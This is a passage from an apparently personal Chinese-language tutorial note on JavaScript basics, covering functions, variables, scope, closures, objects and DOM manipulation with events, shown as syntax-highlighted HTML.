class=\"token string\">'Wizard'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>点击这里        //可以发送任意多的参数，变量接受参数时是按顺序的</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span>job</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// 参数要作为变量声明</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome \"</span> <span class=\"token operator\">+</span> name <span class=\"token operator\">+</span> <span class=\"token string\">\", the \"</span> <span class=\"token operator\">+</span> job<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><a href=\"%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%B0%86%E4%BC%9A%E8%A2%AB%E8%BF%94%E5%9B%9E%E5%80%BC%E5%8F%96%E4%BB%A3%E3%80%82%E5%8D%B3%E4%BD%BF%E4%B8%8D%E5%B0%86%E5%AE%83%E4%BF%9D%E5%AD%98%E4%B8%BA%E5%8F%98%E9%87%8F%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8\">带有返回值的函数</a>：和 C 一样 return 变量；</p>\n<p><strong>注意：</strong> 整个 JavaScript 并不会停止执行，仅仅是函数。JavaScript 将继续执行代码，从调用函数的地方。</p>\n<p>如果只是想退出函数，不继续执行，那么 return 可以不带任何参数</p>\n<h4 id=\"2变量\"><a class=\"anchor\" href=\"#2变量\">#</a> 2. 变量</h4>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> length<span class=\"token punctuation\">;</span>              <span class=\"token comment\">// 不管什么类型，都是用 var</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>length <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 只会获取第一个出现的</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>//<a href=\"%E6%9C%AA%E8%B5%8B%E5%80%BC%E7%9A%84%E5%8F%98%E9%87%8F%E4%BC%9A%E8%BE%93%E5%87%BA%E8%BF%99%E4%B8%AA\">undefined</a> 和 [null](用于清空变量，var a=null)</p>\n<p>如果在判断之后输出，都会是 undifined</p>\n<p>// 字面量是不可变的运算符同样可以出现在赋值中</p>\n<p>// 和 python 一样，变量是动态类型，可以使用 typeof () 来查看变量类型</p>\n<p>// 存在布尔量，写为 var x=true/false;</p>\n<h5 id=\"运算符\"><a class=\"anchor\" href=\"#运算符\">#</a> 运算符</h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">\b类型</th>\n<th style=\"text-align:left\">实例</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">赋值，算术和位运算符</td>\n<td style=\"text-align:left\">= + - * /</td>\n<td style=\"text-align:left\">在 JS 运算符中描述</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">条件，比较及逻辑运算符</td>\n<td style=\"text-align:left\">== != &lt; &gt;</td>\n<td style=\"text-align:left\">在 JS 比较运算符中描述</td>\n</tr>\n</tbody>\n</table>\n<p>function 用于定义函数在 {} 之间的会一并执行</p>\n<p>js 会忽略多余的空格，可以随便加以提高可读性</p>\n<p>可以在字符串中使用 \\ 折行，可以正常显示</p>\n<p><strong>JavaScript 是脚本语言，浏览器会在读取代码时，逐行地执行脚本代码。而对于传统编程来说，会在执行前对所有代码进行编译。</strong></p>\n<h5 id=\"声明变量类型\"><a class=\"anchor\" href=\"#声明变量类型\">#</a> 声明变量类型</h5>\n<p>可以使用关键词 &quot;new&quot; 来声明其类型：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> carname<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> x<span class=\"token operator\">=</span>   <span class=\"token keyword\">new</span> <span class=\"token class-name\">Number</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> y<span class=\"token operator\">=</span>   <span class=\"token keyword\">new</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">var</span> cars<span class=\"token operator\">=</span>  <span class=\"token keyword\">new</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">var</span> person<span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"对象属性\"><a class=\"anchor\" href=\"#对象属性\">#</a> 对象属性</h5>\n<p>[JavaScript 变量均为对象](可以说 &quot;JavaScript 对象是变量的容器&quot;。但是，我们通常认为 &quot;JavaScript 对象是键值对的容器&quot;。键值对通常写法为 name : value (键与值以冒号分割)。键值对在 JavaScript 对象通常称为对象属性。 JavaScript 对象是属性变量的容器)</p>\n<p>访问对象属性的方法：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>person<span class=\"token punctuation\">.</span>lastName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 或者</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>person<span class=\"token punctuation\">[</span><span class=\"token string\">\"lastName\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 这些表达式相当于一个普通变量</span></pre></td></tr></table></figure><h5 id=\"对象方法\"><a class=\"anchor\" href=\"#对象方法\">#</a> 对象方法</h5>\n<p>对象的方法定义了一个函数，并作为对象的属性存储。</p>\n<p>对象方法通过添加 () 调用 (作为一个函数)。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> person <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token literal-property property\">firstName</span><span class=\"token operator\">:</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token literal-property property\">lastName</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"Doe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token literal-property property\">id</span> <span class=\"token operator\">:</span> <span class=\"token number\">5566</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function-variable function\">fullName</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>firstName <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lastName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">//this 其实等价于 person</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 其实就是将函数作为对象属性（实际上是它的返回值）</span></pre></td></tr></table></figure><p>访问对象方法</p>\n<p>创建：</p>\n<pre><code>methodName : function() &#123;\n    // 代码 \n&#125;\n</code></pre>\n<p>访问：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> person <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token literal-property property\">firstName</span><span class=\"token operator\">:</span> <span class=\"token string\">\"John\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token literal-property property\">lastName</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"Doe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token literal-property property\">id</span> <span class=\"token operator\">:</span> <span class=\"token number\">5566</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function-variable function\">fullName</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>firstName <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lastName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">fullName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// 这时函数是 person 对象的一个方法，如果作为属性访问【即不加 ()】，会返回函数的定义</span></pre></td></tr></table></figure><h5 id=\"ex局部变量\"><a class=\"anchor\" href=\"#ex局部变量\">#</a> EX 局部变量</h5>\n<p>在 JavaScript 函数内部声明的变量（使用 var）是<em>局部</em>变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。</p>\n<p>您可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。</p>\n<p>只要函数运行完毕，本地变量就会被删除。</p>\n<blockquote>\n<p>不在函数内声明的就是全局变量，它会在页面关闭后删除（这就是变量的生命周期）</p>\n</blockquote>\n<h5 id=\"before作用域\"><a class=\"anchor\" href=\"#before作用域\">#</a> BEFORE 作用域</h5>\n<h6 id=\"作用域类型\"><a class=\"anchor\" href=\"#作用域类型\">#</a> <strong>作用域类型</strong></h6>\n<ol>\n<li><strong>全局作用域</strong>：\n<ul>\n<li>全局作用域中的变量在整个程序中都可以访问。</li>\n<li>例如，在浏览器中，全局作用域由  <code>window</code>  对象表示。</li>\n</ul>\n</li>\n<li><strong>函数作用域</strong>：\n<ul>\n<li>函数作用域中的变量只能在该函数内部访问。</li>\n<li>当函数执行完毕后，函数作用域中的变量通常会被销毁。</li>\n</ul>\n</li>\n<li><strong>块级作用域</strong>：\n<ul>\n<li>块级作用域中的变量只能在特定的代码块（如  <code>if</code>  语句、 <code>for</code>  循环、 <code>while</code>  循环等）内部访问。</li>\n<li>JavaScript ES6 引入了  <code>let</code>  和  <code>const</code>  关键字，允许在块级作用域中声明变量。</li>\n</ul>\n</li>\n</ol>\n<h6 id=\"作用域链\"><a class=\"anchor\" href=\"#作用域链\">#</a> 作用域链</h6>\n<p>作用域链是一系列嵌套的作用域，从当前作用域开始，一直到全局作用域结束。当查找变量时，JavaScript 引擎会沿着作用域链向上查找，直到找到该变量或到达全局作用域。</p>\n<h5 id=\"ex未声明的变量\"><a class=\"anchor\" href=\"#ex未声明的变量\">#</a> EX 未声明的变量</h5>\n<p>如果您把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。</p>\n<p>var 声明的属于不可配置全局属性，没有则是 [可配置全局属性](非严格模式下给未声明变量赋值创建的全局变量，是全局对象的可配置属性，可以使用 delete var 删除。)</p>\n<p>在 HTML 中，全局变量是 window 对象，所以 window 对象可以调用函数内的未声明（未加 var) 的局部变量。</p>\n<p>** 注意：** 所有数据变量都属于 [window 对象]( 全局变量，或者函数，可以覆盖 window 对象的变量或者函数，因此，自设变量时尽量不要和已有的 window 变量或函数重名，这样会覆盖掉。局部变量，包括 window 对象可以覆盖全局变量和函数。 )。</p>\n<h6 id=\"外部访问局部变量\"><a class=\"anchor\" href=\"#外部访问局部变量\">#</a> 外部访问局部变量</h6>\n<p>** 通过全局对象：** 在函数内部，可以通过将局部变量赋值给 window 对象的属性来使其成为全局可访问的。例如，使用 <strong>window.a = a;</strong> 语句，可以在函数外部通过 <strong>window.a</strong> 访问到这个局部变量的值。</p>\n<p>** 定义全局变量：** 在函数内部不使用 <strong>var、let</strong> 或 <strong>const</strong> 等关键字声明变量时，该变量会被视为全局变量，从而可以在函数外部访问。但这种做法通常不推荐，因为它可能导致意外的副作用和代码难以维护。</p>\n<p>** 返回值：** 可以通过在函数内部使用 <strong>return</strong> 语句返回局部变量的值，然后在函数外部接收这个返回值。这样，虽然局部变量本身不会被暴露，但其值可以通过函数调用传递到外部。</p>\n<p>**<a href=\"%E8%BF%99%E6%98%AF%E7%94%B1%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E5%BD%A2%E6%88%90%E7%9A%84%EF%BC%8C%E5%8D%B3%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E5%86%85%E5%AE%9A%E4%B9%89%E4%BA%86%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%80%E8%88%AC%E6%98%AF%E8%BF%94%E5%9B%9E%E5%87%BD%E6%95%B0%EF%BC%89\"> 闭包</a>：**JavaScript 中的闭包特性允许内部函数访问外部函数的局部变量。即使外部函数执行完毕后，其局部变量仍然可以被内部函数引用。</p>\n<p>** 属性和方法：** 定义在全局作用域中的变量和函数都会变成 window 对象的属性和方法，因此可以在调用时省略 window，直接使用变量名或函数名。</p>\n<blockquote>\n<p>闭包的一个重要特性是它们可以访问创建时的作用域，即使外部函数已经执行完毕。这意味着闭包可以访问外部函数的局部变量，即使这些变量在外部函数执行完毕后仍然存在。</p>\n</blockquote>\n<h4 id=\"3事件\"><a class=\"anchor\" href=\"#3事件\">#</a> 3. 事件</h4>\n<h1 id=\"dom\"><a class=\"anchor\" href=\"#dom\">#</a> DOM</h1>\n<p>通过 [HTML DOM](当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。)，可访问 JavaScript HTML 文档的所有元素。</p>\n<p>HTML DOM 模型被构造为对象的树：</p>\n<p><img loading=\"lazy\" data-src=\"../AppData/Roaming/Typora/typora-user-images/1728045667035.png\" alt=\"1728045667035\" /></p>\n<p>js 可以改变页面中的：</p>\n<p>html 元素，html 属性（属性本身实际上也以是 js），css 样式</p>\n<p>还可以对事件做出反应</p>\n<h3 id=\"i查找-html-元素\"><a class=\"anchor\" href=\"#i查找-html-元素\">#</a> Ⅰ. 查找 HTML 元素</h3>\n<h5 id=\"通过-id-找到-html\"><a class=\"anchor\" href=\"#通过-id-找到-html\">#</a> 通过 id 找到 HTML</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> x<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"intro\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 未找到就是 null</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 返回是以对象（在 x 中）的形式，即 x.innerHTML</span></pre></td></tr></table></figure><h5 id=\"通过标签名找到-html\"><a class=\"anchor\" href=\"#通过标签名找到-html\">#</a> 通过标签名找到 HTML</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> y<span class=\"token operator\">=</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByTagName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 就是找标签是 & lt;p></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 返回是个数组，形式同上，即 y [0].innerHTML</span></pre></td></tr></table></figure><h5 id=\"通过类名找到-html\"><a class=\"anchor\" href=\"#通过类名找到-html\">#</a> 通过类名找到 HTML</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> x<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByClassName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"intro\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 返回同标签名</span></pre></td></tr></table></figure><h3 id=\"ii改变html\"><a class=\"anchor\" href=\"#ii改变html\">#</a> Ⅱ. 改变 HTML</h3>\n<h5 id=\"1输出流\"><a class=\"anchor\" href=\"#1输出流\">#</a> 1. 输出流</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h5 id=\"2内容\"><a class=\"anchor\" href=\"#2内容\">#</a> 2. 内容</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">\"新的 HTML\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 顺带一提，getElementById () 是方法，innerHTML 是属性，可以套</span></pre></td></tr></table></figure><h5 id=\"3属性\"><a class=\"anchor\" href=\"#3属性\">#</a> 3. 属性</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>attribute<span class=\"token operator\">=</span><span class=\"token string\">\"新属性值\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 改的是值，不是 HTML 属性本身，attribute 是要改的 HTML 属性（不是对象属性）</span></pre></td></tr></table></figure><h5 id=\"4样式css\"><a class=\"anchor\" href=\"#4样式css\">#</a> 4. 样式 (css)</h5>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>property<span class=\"token operator\">=</span>新样式</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//property 就是 style 属性下的 color 等。有横线的都去掉换成下一个字母大写（?）</span></pre></td></tr></table></figure><h5 id=\"5使用事件\"><a class=\"anchor\" href=\"#5使用事件\">#</a> 5. 使用事件</h5>\n<p>包括但不限于：</p>\n<ul>\n<li>元素被点击。</li>\n<li>页面加载完成。</li>\n<li>输入框被修改。</li>\n</ul>\n<p>比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'id1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>color<span class=\"token operator\">=</span><span class=\"token string\">'red'</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>--就是说可以当属性值,也可以调用函数--</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    这就是HTML事件属性</pre></td></tr></table></figure><p>还有：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>p1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>这是一个文本。 这是一个文本。 这是一个文本。 这是一个文本。 这是一个文本。 这是一个文本。 这是一个文本。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>隐藏文本<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>visibility<span class=\"token operator\">=</span><span class=\"token string\">'hidden'</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>显示文本<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\">document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>visibility<span class=\"token operator\">=</span><span class=\"token string\">'visible'</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>--visibility就是设置是否可见--</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h5 id=\"6事件反应\"><a class=\"anchor\" href=\"#6事件反应\">#</a> 6. 事件反应</h5>\n<p>包括但不限于：</p>\n<ul>\n<li>当用户点击鼠标时</li>\n<li>当网页已加载时</li>\n<li>当图像已加载时</li>\n<li>当鼠标移动到元素上时</li>\n<li>当输入字段被改变时</li>\n<li>当提交 HTML 表单时</li>\n<li>当用户触发按键时</li>\n</ul>\n<p>比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>innerHTML<span class=\"token operator\">=</span><span class=\"token string\">'Ooops!'</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>点击文本!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//替换文本</pre></td></tr></table></figure><p>除了 onclick 事件之外，还有：</p>\n<h6 id=\"onload\"><a class=\"anchor\" href=\"#onload\">#</a> <a href=\"%E8%BF%9B%E5%85%A5%E9%A1%B5%E9%9D%A2\">onload</a> 与<a href=\"%E7%A6%BB%E5%BC%80%E9%A1%B5%E9%9D%A2\"> onunload</a></h6>\n<p>&lt;-- 它们用于处理<a href=\"%E4%BD%BF%E7%94%A8checkCookies()%E5%87%BD%E6%95%B0%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%B8%83%E5%B0%94%E5%80%BCtrue%E6%88%96%E8%80%85false%E5%88%B0navigator.cookieEnabled\"> cookie</a>，onload 还用于事先检测访问者的浏览器类型和版本 --&gt;</p>\n<h6 id=\"onchange\"><a class=\"anchor\" href=\"#onchange\">#</a> <a href=\"%E6%94%B9%E5%8F%98%E8%BE%93%E5%85%A5%E5%AD%97%E6%AE%B5\">onchange</a></h6>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">myFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">var</span> x<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token 